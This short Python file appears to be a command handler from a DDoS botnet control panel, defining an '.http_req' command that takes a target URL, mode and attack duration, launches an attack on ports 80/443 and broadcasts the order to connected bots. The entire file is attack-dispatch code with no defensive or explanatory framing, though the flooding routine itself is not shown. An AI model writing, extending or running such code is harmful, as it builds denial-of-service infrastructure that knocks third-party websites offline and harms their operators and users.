from colorama import Fore

def http_req(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        method = args[2]
        secs = args[3]
        mode = args[4]
        if validate_time(secs):
            send(client, ansi_clear, False)
            attack_sent1(ip,"80/443", secs, client)
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
    else:
        send(client, 'Usage: .http_req [URL] [MODE_HEAD] [TIME] [MODE/TYPE]')
        send(client, 'PLs use OTHER OR OTHER_MODE_HEAD FOR SHOW THIS MODE_HEAD and MODE/TYPE')